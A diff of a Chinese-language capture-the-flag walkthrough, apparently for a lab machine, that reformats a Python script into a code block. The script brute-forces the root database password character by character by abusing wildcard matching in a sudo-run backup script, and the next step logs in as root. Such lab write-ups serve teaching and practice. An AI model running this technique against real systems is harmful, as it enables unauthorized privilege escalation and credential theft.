@@ -51,24 +51,25 @@
 **這意味著我們可以暴力破解 DB_PASS 中的每個字元**
 
       12.使用腳本進行密碼破解
+```
+import string
+import subprocess
+all = list(string.ascii_letters + string.digits)
+password = ""
+found = False
 
-      import string
-      import subprocess
-      all = list(string.ascii_letters + string.digits)
-      password = ""
-      found = False
+while not found:
+    for character in all:
+        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
+        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
 
-      while not found:
-          for character in all:
-              command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
-              output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
-
-              if "Password confirmed!" in output:
-                  password += character
-                  print(password)
-                  break
-          else:
-              found = True
+        if "Password confirmed!" in output:
+            password += character
+            print(password)
+            break
+    else:
+        found = True
+   ```   
 ![圖片](https://github.com/favorite986141/jamescao/assets/125249893/532a4da9-484b-4d50-b4d2-27a156a56160)
 
        13.登入root，拿到root.txt
